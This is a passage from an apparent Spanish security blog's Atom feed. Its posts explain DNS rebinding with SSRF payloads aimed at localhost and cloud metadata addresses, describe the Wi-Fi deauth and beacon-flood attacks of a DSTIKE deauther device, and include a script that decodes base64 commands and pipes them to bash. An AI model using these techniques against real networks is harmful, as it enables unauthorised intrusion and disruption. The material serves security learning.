<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-02-11T23:56:03+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">e1abrador.io</title><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><entry><title type="html">DNS Rebind</title><link href="http://localhost:4000/dnsRebind/" rel="alternate" type="text/html" title="DNS Rebind" /><published>2022-02-11T00:00:00+01:00</published><updated>2022-02-11T00:00:00+01:00</updated><id>http://localhost:4000/dnsRebind</id><content type="html" xml:base="http://localhost:4000/dnsRebind/">&lt;p&gt;Este ataque va indirectamente vinculado al SSRF, ya que aunque son ataques completamente distintos, concatenándolo con el SSRF se puede ganar una mayor criticidad, en este ataque, se busca el fallo en el DNS para que, (explicado a alto nivel) después de X número de requests que se envíen desde X número de IPs (1 o varias), el servidor DNS nos responda con una IP distinta a la que debería responder.&lt;/p&gt;

&lt;p&gt;Si hago esto en un SSRF:&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;example.com/test.php?url=http://127.0.0.1:80
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aunque el puerto 80 esté abierto internamente y aunque la IP sea correcta, lo mas probable es que el WAF bloquee la request ya que “127.0.0.1” estará en la blacklist (se puede intentar bypassear de diferentes formas, pero ahora hablaremos del DNS Rebinding).
La idea de esto, es que ejecutará la request al dominio example.com desde nuestra IP, por lo que no tendremos acceso. Pues bien, con el DNS Rebinding se puede probar si el servidor es vulnerable, voy a poner un ejemplo práctico (únicamente testeando el dominio):&lt;/p&gt;

&lt;p&gt;Si hacemos una request al dominio &lt;b&gt;make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms&lt;/b&gt;:&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms                                   
&lt;span class=&quot;go&quot;&gt;make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms has address 169.254.169.254
Host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms not found: 3(NXDOMAIN)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Sale que la IP es la 169…, esto es correcto, pero, si se hacen mas requests seguidas a este dominio, se puede intentar que salga una IP distinta:&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms                                   
&lt;span class=&quot;go&quot;&gt;make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms has address 169.254.169.254
Host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms not found: 3(NXDOMAIN)
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms                                   
&lt;span class=&quot;go&quot;&gt;make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms has address 169.254.169.254
Host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms not found: 3(NXDOMAIN)
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms                                   
&lt;span class=&quot;go&quot;&gt;make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms has address 169.254.169.254
Host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms not found: 3(NXDOMAIN)
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms                                   
&lt;span class=&quot;go&quot;&gt;make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms has address 169.254.169.254
Host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms not found: 3(NXDOMAIN)
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms                                   
&lt;span class=&quot;go&quot;&gt;make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms has address 1.2.3.4
Host make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms not found: 3(NXDOMAIN)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En la última petición DNS ha cambiado la IP, pues bien, si se hace el SSRF justo cuando la IP cambia a 1.2.3.4 (o a la que corresponda), la request ya no se interpretará desde la IP del atacante sino de la del propio servidor remoto, en este caso, si tendríamos acceso a el contenido desde el navegador que estemos buscando a través del SSRF (archivos, enumeración de puertos internos/IPs internas, etc).&lt;/p&gt;

&lt;p&gt;Sabiendo esto en caso del SSRF, la mejor opción es enviarlo al intruder para ver si, por ejemplo, después de 100 requests, el servidor responde con una longitud/código de estado distinto.&lt;/p&gt;

&lt;p&gt;Para probar el servidor sin necesidad de utilizar el comando host X veces manualmente o probarlo a través de un SSRF, he creado un script en bash muy simple que ayuda a automatizar el testeo del DNS:&lt;/p&gt;

&lt;p&gt;Ejecución del script:&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;chmod +x testDnsRebind.sh
./testDnsRebind.sh google.com 10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;tests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;$tests&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;host_ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;host &lt;span class=&quot;nv&quot;&gt;$domain&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;address | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $NF}'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$host_ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;wait&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para limpiar el output, el script mostrará únicamente la IP con la que responde el servidor y 1 sola vez todas las IPs que se obtengan en el output.&lt;/p&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="dns" /><category term="DNS" /><summary type="html">En este artículo, explico que es el DNS Rebind y como explotarlo.</summary></entry><entry><title type="html">DSTIKE deauther V3</title><link href="http://localhost:4000/dstike_deauther_v3/" rel="alternate" type="text/html" title="DSTIKE deauther V3" /><published>2021-10-26T00:00:00+02:00</published><updated>2021-10-26T00:00:00+02:00</updated><id>http://localhost:4000/dstike_deauther_v3</id><content type="html" xml:base="http://localhost:4000/dstike_deauther_v3/">&lt;h2 id=&quot;qué-es-dstike-deauther&quot;&gt;¿Qué es DSTIKE Deauther?&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;DSTIKE Deauther&lt;/strong&gt; es una herramienta, entre otras, que sale en la serie de Mr Robot, este dispositivo se utiliza para bloquear y denegar conexiones de redes wifi.&lt;/p&gt;

&lt;p&gt;Para acceder a la web de compra, pulsa &lt;a href=&quot;https://www.amazon.es/Seamuing-desarrollo-programable-incorporada-impresi%C3%B3n/dp/B08XJ8W9TT/ref=sr_1_1?__mk_es_ES=%C3%85M%C3%85%C5%BD%C3%95%C3%91&amp;amp;dchild=1&amp;amp;keywords=dstike&amp;amp;qid=1635271572&amp;amp;qsid=261-8620237-3578240&amp;amp;sr=8-1&amp;amp;sres=B08XJ8W9TT%2CB089R5XQ87%2CB082TNGSRN%2CB09BLSWT2G%2CB08RRVBZKM%2CB092ST6LQW%2CB088LV6ZBG%2CB092R63HXC%2CB092TPJDY1%2CB09377CQ7P%2CB08TX3451X%2CB06Y1RVHBP%2CB09HG9CC7B%2CB07DKD79Y9%2CB06XFTLN43%2CB078J7LDLY%2CB06Y1LZLLY%2CB07QPN951P%2CB06Y1ZPNMS%2CB09573BPY8&quot;&gt;aquí&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;Vista rápida del dispositivo&lt;/h1&gt;

&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;350&quot; height=&quot;500&quot; src=&quot;/assets/images/dstike/partes.png&quot; /&gt;
&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1 - Este botón, en caso de pulsarse 3 segundos, se encienden unas luces a modo de linterna, para apagarlo, se tiene que mantener pulsado otros 3 segundos.&lt;/li&gt;
  &lt;li&gt;2 - En esta parte, hay un láser.&lt;/li&gt;
  &lt;li&gt;3 - Esta es la parte donde se puede flashear el firmware del dispositivo, tiene un puerto USB y si lo conectamos a nuestra máquina Linux, siguiendo esta guía se puede hacer sin problema: &lt;a href=&quot;https://github.com/SpacehuhnTech/esp8266_deauther/wiki/Installation#flashing-the-firmware-bin-file&quot;&gt;Falshear Firmware&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;4 - En caso de pulsar este botón, se restablecerá el dispositivo a los valores de fábrica.&lt;/li&gt;
  &lt;li&gt;5 - Es la pantalla donde se puede elegir lo que se quiere hacer con el DSTIKE&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En el lateral derecho, hay una rueda, con la cual se puede seleccionar lo que queremos hacer, lo veremos en el siguiente apartado del artículo.
En el lateral izquierdo, se puede ver un puerto micro-usb y la batería del dispositivo, la batería se reparte en 4 pequeñas rayas, cada raya corresponde a un 25% de la batería.&lt;/p&gt;

&lt;h1&gt;Opciones del dispositivo&lt;/h1&gt;

&lt;p&gt;En el apartado de “&lt;b&gt;SCAN&lt;/b&gt;”, se pueden encontrar las siguientes opciones (Hay que tener en cuenta que este dispositivo, por ahora, solo puede escanear redes 2.4G):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Escaneo de Puntos de Acceso y clientes conectados a la red [&lt;b&gt;SCAN AP + ST&lt;/b&gt;]&lt;/li&gt;
  &lt;li&gt;Escaneo únicamene de Puntos de Acceso [&lt;b&gt;SCAN APs&lt;/b&gt;]&lt;/li&gt;
  &lt;li&gt;Escaneo únicamente de clientes conectados a la red [&lt;b&gt;SCAN Stations&lt;/b&gt;]&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;350&quot; height=&quot;500&quot; src=&quot;/assets/images/dstike/scan_options.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;En el apartado de “&lt;b&gt;SELECT&lt;/b&gt;”, se puede seleccionar sobre que item router/cliente que se ha obtenido en la fase de escaneo se quiere realizar un ataque.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Selección de Puntos de Acceso [&lt;b&gt;APs&lt;/b&gt;]&lt;/li&gt;
  &lt;li&gt;Selección de Clientes [&lt;b&gt;Stations&lt;/b&gt;]&lt;/li&gt;
  &lt;li&gt;&lt;b&gt;Names&lt;/b&gt; (He estado investigando y no he encontrado el uso de esta opción, después de realizar varios escaneos esta opción sigue a 0.)&lt;/li&gt;
  &lt;li&gt;&lt;b&gt;SSIDs&lt;/b&gt; (El uso de esta opción es igual a la primera de este apartado, he hecho pruebas y he creado redes con el DSTIKE y en caso de crearlo si que salen para seleccionar.)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Únicamente con las 2 primeras opciones es suficiente para efectuar ataques, también en esta versión de DSTIKE está la opción de seleccionar todos los clientes y todos los puntos de acceso que se hayan escaneado.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;350&quot; height=&quot;500&quot; src=&quot;/assets/images/dstike/scan_options_1.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;En el apartado de “&lt;b&gt;ATTACK&lt;/b&gt;”, se puede elegir que tipo de ataque se va a efectuar.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Ataque de deautenticación (En caso que no se seleccione ningún cliente, se utilizará la MAC Broadcast address -&amp;gt; FF:FF:FF:FF:FF:FF) [&lt;b&gt;DEAUTH&lt;/b&gt;]&lt;/li&gt;
  &lt;li&gt;Beacon Flood Attack , este ataque consiste en crear diferentes puntos de acceso en un canal en concreto para saturar dicho canal y hacer que o bien la conexión sea lenta o bien que se desconecten los clientes. [&lt;b&gt;BEACON&lt;/b&gt;]&lt;/li&gt;
  &lt;li&gt;Esta opción se supone que es para generar paquetes probe request/response, pero para dengar una conexión, con los 2 anteriores es suficinete, no le veo el uso a esta opción [&lt;b&gt;PROBE&lt;/b&gt;]&lt;/li&gt;
&lt;/ul&gt;

&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;350&quot; height=&quot;500&quot; src=&quot;/assets/images/dstike/attack_mode.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;En el apartado “&lt;b&gt;PACKET MONITOR&lt;/b&gt;” se pueden escanear los distintos canales, del 1 al 14, para ver si en la zona que se esta escaneando hay tráfico wifi o no. Hay que tener en cuena que DSTIKE no hace channel hopping de forma automática, si giramos la rueda, se cambiará de canal.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;350&quot; height=&quot;500&quot; src=&quot;/assets/images/dstike/packet_monitor.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;En el apartado “&lt;b&gt;CLOCK&lt;/b&gt;” se puede cambiar la hora y poner el modo reloj, para que se vea la hora.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;350&quot; height=&quot;500&quot; src=&quot;/assets/images/dstike/clock.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Finamente, en el apartado “&lt;b&gt;LED&lt;/b&gt;”, en esta versión del DSTIKE, simplemente es un láser, según el vendedor, llega entre 50 y 100 metros.&lt;/p&gt;

&lt;p&gt;Por último a comentar sobre el DSTIKE, hay que decir que crea una red de forma automática, esta red se llama &lt;b&gt;pwned&lt;/b&gt;, la contraseña por defecto es &lt;b&gt;deauther&lt;/b&gt;, aunque se puede cambiar. Al conectarse desde otro dispositovo, si se accede al navegador y se busca google.es, debería redirigir de forma automática a la web del reloj, en esta web, se puede gestionar todo lo comentado anteriormente des del otro terminal. Adicionalmente, únicamente desde la web, se puede cambiar la MAC (cosa que no se puede desde el reloj), recomiendo cambiar la MAC como buena práctica, (con el comando &lt;b&gt;mcchanger -l&lt;/b&gt; hay una larga lista de MAC’s, recomiendo utilizar una de ese listado).&lt;/p&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="script" /><category term="hardware hacking" /><category term="wireless" /><summary type="html">En este artículo, explico la utilidad del aparato DSTIKE Deauther v3 y todas sus funciones, también dejo el enlace de compra.</summary></entry><entry><title type="html">autoRPC</title><link href="http://localhost:4000/autoRPC/" rel="alternate" type="text/html" title="autoRPC" /><published>2021-10-18T00:00:00+02:00</published><updated>2021-10-18T00:00:00+02:00</updated><id>http://localhost:4000/autoRPC</id><content type="html" xml:base="http://localhost:4000/autoRPC/">&lt;h2 id=&quot;qué-es-autorpc&quot;&gt;¿Qué es autoRPC?&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;autoRPC&lt;/strong&gt; es una herramienta la cual automatiza la enumeración del protocolo RPC de Windows.&lt;/p&gt;

&lt;p&gt;La herramienta funciona iterando sobre unos comandos aplicables al servicio RPC, como por ejemplo &lt;b&gt;enumdomusers&lt;/b&gt;. Mediante el uso de variables de bash y bucles for, se consigue obtener la información que pretendo obtener de forma automática en el script. He añadido una interfaz de shell para que la experiéncia de usuario sea mejor, en cada utilidad que tenga el script, se pedirán credenciales de usuario o no, la IP del servidor remoto siempre se pide.&lt;/p&gt;

&lt;p&gt;autoRPC se puede obtener en mi github personal:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/e1abrador/autoRPC&quot;&gt;https://github.com/e1abrador/autoRPC&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para utilizar autoRPC, es tan senzillo como:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash autoRPC.sh &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Con la flag “-h” saltará el panel de ayuda, simplemente poniendo la flag de lo que se quiera enumerar, ej:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash autoRPC &lt;span class=&quot;nt&quot;&gt;-unauth-domain-admins&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Con este ejemplo, el script simplemente solicitará una IP, si la IP se introduce y el servidor remoto acepta conexiones RCP, en este caso, sin autenticación, se enumerarán los usuarios administradores del Directorio Activo. Para saber que hace cada flag, he implementado una pequeña descripción en el panel de ayuda para que no hayan dudas.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;960&quot; height=&quot;700&quot; src=&quot;/assets/images/autoRPC/options.png&quot; /&gt;
&lt;/p&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="script" /><category term="Windows" /><category term="enumeration" /><category term="RPC" /><summary type="html">En este artículo, explico la utilidad de la herramienta autoRPC, escrita en Bash.</summary></entry><entry><title type="html">subdomainDump</title><link href="http://localhost:4000/security-trails-subdomains/" rel="alternate" type="text/html" title="subdomainDump" /><published>2021-10-17T00:00:00+02:00</published><updated>2021-10-17T00:00:00+02:00</updated><id>http://localhost:4000/security-trails-subdomains</id><content type="html" xml:base="http://localhost:4000/security-trails-subdomains/">&lt;p align=&quot;center&quot;&gt;
  &lt;img width=&quot;960&quot; height=&quot;700&quot; src=&quot;/assets/images/subdomain/securitytrails.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;qué-es-subdomaindump&quot;&gt;¿Qué es subdomainDump?&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;subdomainDump&lt;/strong&gt; es una herramienta escrita en bash. Este script automatiza la obtención de subdominios a través de la web &lt;a href=&quot;https://securitytrails.com/&quot;&gt;https://securitytrails.com/&lt;/a&gt;. En lugar de arrastrar las cookies de sesión, dado que es mas sencillo con la API, simplemente utilizaremos dicha API para gestionar todas las requests. Es una web muy útil en Bug Bounty, sobretodo en la parte de Reconocimiento en los dominios “scope” que correspondan.&lt;/p&gt;

&lt;p&gt;Para utilizar la herramienta, el primer paso es añadir el API KEY de la cuenta del usuario. Debería quedar de la siguiente forma:&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;API_KEY=&quot;'apikey:rWxW89Sbee...'&quot;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La API KEY se puede obtener a través del siguiente enlace:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://securitytrails.com/app/account/credentials&quot;&gt;https://securitytrails.com/app/account/credentials&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A continuación, ya se puede ejecutar el script:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash subdomainDump.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;El script solicitará un dominio, para realizar una prueba se puede utilizar &lt;b&gt;google.es&lt;/b&gt;.&lt;/p&gt;

&lt;p&gt;Código del script:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;API_KEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;'apikey:&amp;lt;api key here&amp;gt;'&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] Domain: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;domain
&lt;span class=&quot;c&quot;&gt;#Example: google.es&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;first_url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Y3VybCAtcyAtLXJlcXVlc3QgR0VUIC0tdXJsIGh0dHBzOi8vYXBpLnNlY3VyaXR5dHJhaWxzLmNvbS92MS9kb21haW4vCg==&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;base64_domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$domain&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;subdomains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/subdomains --header &quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;api_key_base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$API_KEY&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;third_url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fCB0ciAnXG4nICcgJyB8IHRyIC1kICcgJyB8IGdyZXAgLW9QICJcWy4qP1xdIiB8IHRyIC1kICdbXScgfHRyICcsJyAnXG4nIHwgdHIgLWQgJyIn&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$first_url$base64_domain$subdomains$api_key_base64$third_url&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;c&quot;&gt;#execute command + output&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/sec.txt
&lt;span class=&quot;nv&quot;&gt;all_domains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/sec.txt | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt; | bash&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;line &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$all_domains&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
	&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$domain&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /tmp/sec.txt

